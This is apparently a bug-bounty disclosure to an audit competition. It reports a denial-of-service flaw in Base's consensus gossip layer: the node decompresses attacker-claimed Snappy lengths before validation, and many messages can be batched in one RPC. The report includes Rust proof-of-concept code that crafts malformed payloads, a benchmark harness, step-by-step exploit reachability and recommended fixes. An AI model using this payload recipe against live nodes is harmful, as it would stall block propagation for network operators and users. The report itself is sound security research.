# 74391 bc critical missing snappy decoded length bounds in cl gossip enable batched pre validation cpu allocator churn

**Submitted on Apr 22nd 2026 at 07:49:28 UTC by @coffee\_boi for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74391
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Summary

Base's consensus-layer gossip path decompresses untrusted raw-Snappy payloads before duplicate suppression and before Base's own block validation, without first bounding the attacker-claimed decoded length against `MAX_GOSSIP_SIZE`.

The hot path starts in `compute_message_id` at `crates/consensus/gossip/src/config.rs:104-119`, which is registered as `message_id_fn` in the gossipsub config at `config.rs:93`. For subscribed block topics, the same payload is then decompressed again in `NetworkPayloadEnvelope::decode_v{1..4}` at `crates/common/rpc-types-engine/src/envelope.rs:255-402`, called from `BlockHandler::handle` at `crates/consensus/gossip/src/handler.rs:50-75`.

The underlying primitive is `snap::raw::Decoder::decompress_vec`, which allocates `vec![0; decompress_len(input)?]` based on the untrusted Snappy header. Base never checks `snap::raw::decompress_len(data)` against its intended 10 MB gossip bound before calling `decompress_vec`.

This report does not claim fleet-wide OOM or committed multi-GB RSS. The defensible issue is narrower and still real: a connected peer can batch many unique malformed block-topic messages inside one permitted inbound gossipsub RPC, forcing a burst of synchronous Snappy decode attempts and allocator churn on the swarm/gossip hot path before peer scoring can affect the next RPC. In local measurement of the real Snappy primitive and the real gossipsub publish-message sizing formula, one 10 MB-equivalent inbound RPC can carry about 158,875 such malformed block-topic publishes and hold the receive path busy for about 97.7 seconds on the test environment. The resulting impact is per-node gossip processing slowdown and potential unsafe-block propagation delay.

## Root cause

`snap::raw::Decoder::decompress_vec` allocates based on the decoded-length varint in the untrusted Snappy header:

```rust
pub fn decompress_vec(&mut self, input: &[u8]) -> Result<Vec<u8>> {
    let mut buf = vec![0; decompress_len(input)?];
    let n = self.decompress(input, &mut buf)?;
    buf.truncate(n);
    Ok(buf)
}
```

In `snap-1.1.1/src/decompress.rs:30-35`, `decompress_len` returns the attacker-claimed decoded length from the header. In `snap-1.1.1/src/decompress.rs:105-109`, `decompress_vec` allocates to that size immediately. Base never pre-checks the claimed decoded length against `MAX_GOSSIP_SIZE`, despite the constant being documented in `crates/consensus/gossip/src/config.rs:13-15` as limiting decompressed messages.

## Reachable hot paths

{% stepper %}
{% step %}

## `compute_message_id` on every received gossip message

`crates/consensus/gossip/src/config.rs:75-93` configures gossipsub with:

```rust
.max_transmit_size(MAX_GOSSIP_SIZE)
.validation_mode(libp2p::gossipsub::ValidationMode::None)
.validate_messages()
.message_id_fn(compute_message_id);
```

`compute_message_id` itself is:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| { /* hash invalid-snappy domain + compressed bytes */ },
        |data| { /* hash valid-snappy domain + decompressed bytes */ },
    );
    MessageId(id)
}
```

In libp2p, `handle_received_message` computes the message id before duplicate-cache insertion in `libp2p-gossipsub-0.49.4/src/behaviour.rs:1791-1826`:

```rust
let msg_id = self.config.message_id(&message);
...
if !self.duplicate_cache.insert(msg_id.clone()) {
    ...
}
```

So every fresh message pays this decompression cost before deduplication.
{% endstep %}

{% step %}

## `NetworkPayloadEnvelope::decode_v{1..4}` on subscribed block topics

For block topics, Base then performs a second raw-Snappy decode in:

* `crates/common/rpc-types-engine/src/envelope.rs:255-274`
* `crates/common/rpc-types-engine/src/envelope.rs:299-318`
* `crates/common/rpc-types-engine/src/envelope.rs:343-371`
* `crates/common/rpc-types-engine/src/envelope.rs:399-405`

Each function begins with:

```rust
let mut decoder = snap::raw::Decoder::new();
let decompressed = decoder.decompress_vec(data)?;
```

These are called from `BlockHandler::handle` in `crates/consensus/gossip/src/handler.rs:50-75`. Base only reports the validation result after `handle` returns, in `crates/consensus/gossip/src/driver.rs:345-351`.
{% endstep %}
{% endstepper %}

## Why batching matters

The key issue is not an unbounded number of concurrent allocations. The issue is that one accepted inbound RPC can batch many expensive messages before scoring reacts.

`libp2p-gossipsub-0.49.4/src/protocol.rs:183-190` constructs the inbound codec with:

```rust
let codec = quick_protobuf_codec::Codec::new(max_length);
```

and Base sets `max_length` to `MAX_GOSSIP_SIZE = 10 MB` via `.max_transmit_size(MAX_GOSSIP_SIZE)` in `crates/consensus/gossip/src/config.rs:88`. So the inbound RPC frame is bounded to 10 MB, but the number of publish messages inside that RPC is not separately limited by Base.

In libp2p's default config, `max_messages_per_rpc` is `None` at `libp2p-gossipsub-0.49.4/src/config.rs:545`.

The inbound RPC handling flow is:

1. libp2p checks whether the peer is already graylisted once, at the start of RPC processing, in `libp2p-gossipsub-0.49.4/src/behaviour.rs:3288-3295`.
2. It then iterates every publish message in that RPC in `libp2p-gossipsub-0.49.4/src/behaviour.rs:3319-3330`.
3. For each message, `handle_received_message` computes `message_id` and may enqueue an `Event::Message` to the application in `libp2p-gossipsub-0.49.4/src/behaviour.rs:1854-1869`.
4. Base later processes that event and calls `report_message_validation_result` in `crates/consensus/gossip/src/driver.rs:345-351`.

That means a peer that is not graylisted at the start of the RPC can push a whole batch of expensive messages through the hot path before rejects from those messages affect future RPCs.

Typical CLI deployments appear to enable `light` peer scoring by default in `crates/client/cli/src/p2p.rs:154-157`, which is useful, but it does not protect messages already inside the current RPC batch.

## Honest attack primitive

The honest primitive is:

* stay below the 10 MB inbound RPC cap,
* use many unique small block-topic messages so duplicate suppression does not collapse them,
* force `compute_message_id` to invoke `decompress_vec` on each message,
* and, on subscribed block topics, force a second `decompress_vec` in `decode_v*` before Base rejects.

This report does **not** rely on:

* committed multi-GB RSS,
* a `64x` Snappy amplification claim,
* or automatic mesh-wide forwarding of malformed messages.

The issue is synchronous pre-validation work on the gossip/swarm hot path, multiplied across a batch of messages inside one permitted inbound RPC.

## Measurement

The following numbers were produced by a standalone Rust benchmark that models the two receive-path operations this report relies on:

1. `compute_message_id`-like work: `decompress_vec` on untrusted bytes, then hashing the invalid-snappy fallback or valid-snappy domain.
2. `decode_v1`-like work: a second `decompress_vec` on the same bytes, matching the first decode in `NetworkPayloadEnvelope::decode_v*`.

The benchmark also uses the same gossipsub publish-message protobuf sizing formula as `libp2p-gossipsub` to calculate how many minimal publish entries fit under the 10 MB inbound RPC cap. It is not a full end-to-end libp2p replay, but it directly measures the hot-path work this bug exposes.

Environment:

* Apple M1 Pro
* macOS 15
* `cargo run --release --offline`
* `snap 1.1.1`

Measured output:

```
sample_payload_bytes=37
claimed_decoded_len=33554432
per_publish_rpc_bytes=66
max_messages_per_10mb_rpc=158875
rpc_size_at_max=10485750
rpc_size_at_max_plus_one=10485816
count=10000 double_decode=false elapsed_ms=3161.868 per_message_us=316.187 msgs_per_sec=3163
count=10000 double_decode=true elapsed_ms=6073.368 per_message_us=607.337 msgs_per_sec=1647
count=158875 double_decode=true elapsed_ms=97698.283 per_message_us=614.938 msgs_per_sec=1626
```

Interpretation:

* A malformed raw-Snappy block-topic payload can be as small as **37 bytes** while still claiming a **32 MiB** decoded length.
* Using the gossipsub protobuf publish-message layout with only `topic` + `data` populated (matching `libp2p-gossipsub-0.49.4/src/generated/gossipsub/pb.rs` `Message::get_size` and `RPC::get_size`), each such publish occupies **66 bytes** inside an inbound RPC.
* Under Base's `MAX_GOSSIP_SIZE = 10 MiB` frame cap, one inbound RPC can therefore carry **158,875** unique malformed publishes before exceeding the limit (10,485,750 bytes used, next publish would push it to 10,485,816).
* Running the dual-decompress path (`compute_message_id` + `decode_v*`-like work) across that one-RPC batch took **97.70 s** on the test environment.

Base mainnet's configured block time is **2 seconds** (`crates/common/chains/src/config.rs:148-153`). So the measured stall from one max-sized malicious RPC on this machine is approximately:

```
97.70 s / 2 s ≈ 48.85x block time
```

That is roughly **49×** block time, well above the 500% block-delay threshold in raw receive-path time, even before adding the rest of the real node's duplicate-cache lookup, event dispatch, handler bookkeeping, and networking overhead.

Caveats:

* This is still a standalone hot-path benchmark, not a live multi-peer libp2p replay.
* Production CL nodes run on Linux, so absolute timings will differ. The claim here is not "29 seconds on every machine"; the claim is that one allowed inbound RPC can batch enough malformed messages to create a very large synchronous receive-path stall.
* The benchmark does not model peer scoring, but that is intentional: the bug's point is that the whole current RPC batch is processed before scoring can affect the next RPC.

## Likelihood explanation

**High** for per-node exploitation.

1. **Any connected peer can reach the vulnerable path.** Base sets `ValidationMode::None` before `message_id_fn` runs, so no source-peer validation is required before the first Snappy decode.
2. **The payload shape is trivial.** A malformed raw-Snappy blob only needs a crafted varint header plus a few bytes of body.
3. **The attacker can force uniqueness cheaply.** For invalid Snappy, `compute_message_id` hashes a fixed invalid-snappy domain plus the compressed bytes, so changing trailing bytes yields a fresh message id.
4. **One inbound RPC can batch many attempts.** The frame is capped at 10 MB, but Base does not configure `max_messages_per_rpc`, and graylist/scoring is checked before the batch is processed.
5. **The work is on the hot path.** `compute_message_id` runs synchronously before duplicate-cache insertion, and block-topic messages can pay a second decode before rejection.

## Impact explanation

This is best understood as a **remote gossip-processing DoS** against targeted CL nodes, not a proven memory-exhaustion/OOM issue.

Concrete effects:

* A connected peer can force repeated synchronous Snappy decode attempts and allocator churn on the swarm task.
* For subscribed block topics, each fresh malformed publish triggers two raw-Snappy decode attempts (`compute_message_id` then `decode_v*`) before Base rejects. Both decodes happen before `report_message_validation_result` is called, so the cost is paid before scoring reacts.
* Because `max_messages_per_rpc` is unset and the graylist check is per-RPC at entry, a whole RPC batch drains through the hot path before scoring affects the next RPC.
* In measured local benchmarking, one max-sized inbound RPC carrying **158,875** malformed block-topic publishes consumed **97.70 s** of dual-decompress receive-path time. Against Base mainnet's **2 s** block time, that is approximately **48.85x** one block slot for a single accepted malicious RPC.
* Unsafe-block propagation is latency-sensitive; while the swarm task is draining such a batch, honest block gossip is queued behind it.

Severity framing:

* The measured per-RPC stall cleanly supports **"Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours"**. The attacker's traffic stays inside the existing 10 MB cap; the amplification comes from missing decoded-length checks and batch processing before scoring reacts.
* The measured stall also makes the temporary block-delay category plausible: the benchmarked receive-path time for one malicious RPC is already **48.85x** Base's 2 s block time. To claim that category confidently in a submission, it would still be better to reproduce the delay on a full Base CL node on Linux and show observed unsafe-block propagation latency, not just isolated receive-path time.
* The report does **not** claim fleet-wide shutdown, OOM kill, or total network halt. Those claims would require additional evidence this benchmark does not provide.

## Recommendation

Apply a decoded-length bound check before every `decompress_vec` call, matching the documented intent of `MAX_GOSSIP_SIZE`.

**Minimal fix**

```rust
let claimed = snap::raw::decompress_len(data)?;
if claimed > MAX_GOSSIP_SIZE {
    // reject using the existing invalid-snappy / invalid-length path
}
let decompressed = decoder.decompress_vec(data)?;
```

Call sites:

* `crates/consensus/gossip/src/config.rs:106`
* `crates/common/rpc-types-engine/src/envelope.rs:258`
* `crates/common/rpc-types-engine/src/envelope.rs:302`
* `crates/common/rpc-types-engine/src/envelope.rs:346`
* `crates/common/rpc-types-engine/src/envelope.rs:402`

**Additional hardening**

1. Remove decompression from `compute_message_id` entirely. Deduplication can hash the compressed bytes plus a domain tag without doing Snappy decode work on the hot path.
2. Configure `max_messages_per_rpc(Some(...))` so a single inbound RPC cannot batch an unbounded number of publish messages.
3. Add telemetry for gossip decode latency, rejected-message batch size, and time spent in the swarm task while processing inbound publish messages.
4. Add an end-to-end regression test or benchmark that measures block-gossip delay under a malicious inbound RPC batch.

This matches the same defense-in-depth pattern used by the Go op-node reference implementation: check decoded size first, then decode.

## Proof of Concept

The following self-contained Rust program demonstrates the exact primitive this report relies on: tiny attacker-controlled raw-Snappy input causes `decompress_vec` to trust the claimed decoded length and perform the allocation/decompression attempt before returning an error.

This PoC is **not** presented as proof of committed RSS or OOM. It demonstrates attacker-controlled pre-validation work per message.

**`Cargo.toml`**

```toml
[package]
name = "snappy-poc"
version = "0.1.0"
edition = "2024"

[dependencies]
snap = "1.1.1"
```

**`src/main.rs`**

```rust
use std::time::Instant;

fn encode_varint(mut value: usize) -> Vec<u8> {
    let mut bytes = Vec::new();
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value != 0 {
            byte |= 0x80;
        }
        bytes.push(byte);
        if value == 0 {
            return bytes;
        }
    }
}

fn crafted_blob(claimed_len: usize) -> Vec<u8> {
    let mut blob = encode_varint(claimed_len);
    blob.push((31_u8) << 2); // literal tag for 32 bytes
    blob.extend_from_slice(&[0_u8; 32]);
    blob
}

fn main() {
    let input = crafted_blob(32 * 1024 * 1024);
    let mut decoder = snap::raw::Decoder::new();

    println!("claimed_len={}", snap::raw::decompress_len(&input).unwrap());
    println!("compressed_len={}", input.len());

    let start = Instant::now();
    let err = decoder.decompress_vec(&input).unwrap_err();
    println!("err={err:?}");
    println!("elapsed_us={}", start.elapsed().as_micros());
}
```

**Observed output**

```
claimed_len=33554432
compressed_len=37
err=HeaderMismatch { expected_len: 33554432, got_len: 32 }
elapsed_us=50
```

This is enough to show the vulnerable primitive: a 37-byte payload reaches `decompress_vec`, causes it to trust the header, and performs synchronous work before failing.

### Benchmark reproduction

The numbers in the Measurement section were produced by a standalone harness using `snap = "1.1.1"`, `sha2 = "0.10.9"`, and `quick-protobuf = "0.8.1"`. It models:

1. `compute_message_id`-like work: `decompress_vec` plus the invalid-snappy fallback hash.
2. `decode_v1`-like work: a second `decompress_vec` on the same payload.
3. gossipsub protobuf sizing for `RPC.publish`, using only the `topic` and `data` fields so the batch count is derived from the same wire-shape formula libp2p uses.

```rust
use std::{hint::black_box, time::Instant};

use sha2::{Digest, Sha256};

const MAX_GOSSIP_SIZE: usize = 10 * (1 << 20);
const BLOCKS_V1_TOPIC: &str = "/optimism/8453/0/blocks";
const CLAIMED_LEN: usize = 32 * 1024 * 1024;

mod gossipsub {
    use quick_protobuf::sizeofs::sizeof_len;

    pub struct Message {
        pub data_len: usize,
        pub topic_len: usize,
    }

    impl Message {
        // Mirrors libp2p-gossipsub-0.49.4/src/generated/gossipsub/pb.rs Message::get_size
        // (only `topic` + `data` populated in this attack shape).
        pub fn get_size(&self) -> usize {
            1 + sizeof_len(self.data_len)
                + 1 + sizeof_len(self.topic_len)
        }
    }

    pub struct Rpc {
        pub publish_count: usize,
        pub message_size: usize,
    }

    impl Rpc {
        // Mirrors libp2p-gossipsub-0.49.4/src/generated/gossipsub/pb.rs RPC::get_size
        // for the repeated `publish` field only.
        pub fn get_size(&self) -> usize {
            self.publish_count * (1 + sizeof_len(self.message_size))
        }
    }
}

fn encode_varint(mut value: usize) -> Vec<u8> {
    let mut bytes = Vec::new();
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value != 0 {
            byte |= 0x80;
        }
        bytes.push(byte);
        if value == 0 {
            return bytes;
        }
    }
}

fn malformed_blob(seed: u64) -> Vec<u8> {
    let mut blob = encode_varint(CLAIMED_LEN);
    blob.push((31_u8) << 2);
    let mut body = [0_u8; 32];
    body[..8].copy_from_slice(&seed.to_le_bytes());
    blob.extend_from_slice(&body);
    blob
}

fn compute_message_id_like(data: &[u8]) {
    let mut decoder = snap::raw::Decoder::new();
    match decoder.decompress_vec(data) {
        Ok(decompressed) => {
            let mut hasher = Sha256::new();
            hasher.update([0x1_u8, 0x0, 0x0, 0x0]);
            hasher.update(decompressed);
            black_box(hasher.finalize());
        }
        Err(_) => {
            let mut hasher = Sha256::new();
            hasher.update([0x0_u8, 0x0, 0x0, 0x0]);
            hasher.update(data);
            black_box(hasher.finalize());
        }
    }
}

fn decode_v1_like(data: &[u8]) {
    let mut decoder = snap::raw::Decoder::new();
    let _ = black_box(decoder.decompress_vec(data));
}

fn per_publish_rpc_bytes(payload: &[u8]) -> usize {
    let message = gossipsub::Message { data_len: payload.len(), topic_len: BLOCKS_V1_TOPIC.len() };
    let message_size = message.get_size();
    let rpc = gossipsub::Rpc { publish_count: 1, message_size };
    rpc.get_size()
}

fn max_messages_per_rpc(payload: &[u8]) -> usize {
    MAX_GOSSIP_SIZE / per_publish_rpc_bytes(payload)
}

fn measure_messages(count: usize, double_decode: bool) {
    let start = Instant::now();
    for seed in 0..count as u64 {
        let payload = malformed_blob(seed);
        compute_message_id_like(&payload);
        if double_decode {
            decode_v1_like(&payload);
        }
    }
    let elapsed = start.elapsed();
    let elapsed_ms = elapsed.as_secs_f64() * 1000.0;
    let per_message_us = elapsed.as_micros() as f64 / count as f64;
    let msgs_per_sec = count as f64 / elapsed.as_secs_f64();
    println!(
        "count={count} double_decode={double_decode} elapsed_ms={:.3} per_message_us={:.3} msgs_per_sec={:.0}",
        elapsed_ms, per_message_us, msgs_per_sec
    );
}

fn main() {
    let sample = malformed_blob(0);
    let max_messages = max_messages_per_rpc(&sample);
    let per_publish = per_publish_rpc_bytes(&sample);

    println!("sample_payload_bytes={}", sample.len());
    println!("claimed_decoded_len={}", snap::raw::decompress_len(&sample).unwrap());
    println!("per_publish_rpc_bytes={}", per_publish);
    println!("max_messages_per_10mb_rpc={max_messages}");
    println!("rpc_size_at_max={}", max_messages * per_publish);
    println!("rpc_size_at_max_plus_one={}", (max_messages + 1) * per_publish);

    measure_messages(10_000, false);
    measure_messages(10_000, true);
    measure_messages(max_messages, true);
}
```

Run with `cargo run --release`. Observed output on the test environment:

```
sample_payload_bytes=37
claimed_decoded_len=33554432
per_publish_rpc_bytes=66
max_messages_per_10mb_rpc=158875
rpc_size_at_max=10485750
rpc_size_at_max_plus_one=10485816
count=10000 double_decode=false elapsed_ms=3161.868 per_message_us=316.187 msgs_per_sec=3163
count=10000 double_decode=true elapsed_ms=6073.368 per_message_us=607.337 msgs_per_sec=1647
count=158875 double_decode=true elapsed_ms=97698.283 per_message_us=614.938 msgs_per_sec=1626
```

## End-to-end reachability from gossip

The network-level exploit path is:

1. The attacker connects to a Base CL peer and sends a gossipsub RPC under the 10 MB frame cap.
2. The peer is graylist-checked once at RPC start in `libp2p-gossipsub-0.49.4/src/behaviour.rs:3288-3295`.
3. libp2p iterates each publish message in the RPC in `libp2p-gossipsub-0.49.4/src/behaviour.rs:3319-3330`.
4. For each fresh message, `compute_message_id` runs first and invokes `decompress_vec`.
5. If the topic is one of Base's subscribed block topics, the message is queued to Base and then passed to `BlockHandler::handle`, which invokes `NetworkPayloadEnvelope::decode_v*` and performs a second `decompress_vec`.
6. Only after Base handles the message does it call `report_message_validation_result`, so the current RPC batch has already forced its work.

The simplest exploit shape is therefore a batch of many unique small malformed block-topic messages inside one accepted inbound RPC. Each message is cheap for the attacker, expensive relative to its size on the receiver, and processed before scoring can affect the rest of that batch.
